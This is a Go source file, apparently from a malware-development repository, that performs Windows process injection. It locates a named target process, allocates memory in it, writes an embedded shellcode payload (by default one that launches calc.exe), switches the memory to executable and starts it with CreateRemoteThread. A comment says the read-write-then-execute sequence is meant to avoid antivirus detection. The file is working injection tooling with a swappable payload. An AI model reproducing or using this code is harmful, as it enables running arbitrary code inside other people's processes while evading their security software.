//go:build windows
// +build windows

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"unsafe"

	_ "embed"

	"github.com/himazawa/maldev/internal/utils"
	"golang.org/x/sys/windows"
)

var (
	// embedding the payload
	// the default payload will spawn calc.exe
	//go:embed data/shellcode.bin
	payload []byte
)

func main() {
	targetPtr := flag.String("target", "", "name of the target process (e.g notepad.exe)")
	flag.Parse()
	if *targetPtr == "" {
		fmt.Println("You need to specify the target using the -target flag")
		os.Exit(1)
	}

	utils.FreeConsole.Call()
	pid, err := utils.FindPIDFromProcessName(*targetPtr)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println(pid)

	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ|
		windows.PROCESS_VM_WRITE, false, pid)
	if err != nil {
		log.Fatalln(err)
	}
	payloadLen := uintptr(len(payload))

	pRemoteCode, memPerm, err := getProcPointer(uintptr(processHandle), payloadLen)
	if err != nil {
		panic(err)
	}
	utils.WriteProcessMemory.Call(uintptr(processHandle), pRemoteCode, (uintptr)(unsafe.Pointer(&payload[0])), payloadLen)

	// set the exec region from READWRITE to exec
	changeMemoryPermissions(uintptr(processHandle), pRemoteCode, payloadLen, memPerm)

	// spawn process
	utils.CreateRemoteThread.Call(uintptr(processHandle), 0, 0, pRemoteCode, 0, 0, 0)
	windows.CloseHandle(processHandle)

}

// we are setting the permission initially as READWRITE because AV will likely detect it
func getProcPointer(pHandle uintptr, payloadLen uintptr) (uintptr, int, error) {
	memoryPermission := windows.PAGE_READWRITE
	pRemoteCode, _, out := utils.VirtualAllocEx.Call(pHandle, 0, payloadLen, windows.MEM_COMMIT, uintptr(memoryPermission))
	if out != nil && out.Error() != "The operation completed successfully." {
		return 0, memoryPermission, fmt.Errorf("unable to allocate pointer to remote code, %s", out.Error())
	}
	return pRemoteCode, memoryPermission, nil
}

// This function simply sets the permission to executable
func changeMemoryPermissions(pHandle uintptr, pRemoteCode uintptr, payloadLen uintptr, initialPerm int) {
	utils.VirtualProtectEx.Call(pHandle, pRemoteCode, payloadLen, windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&initialPerm)))
}
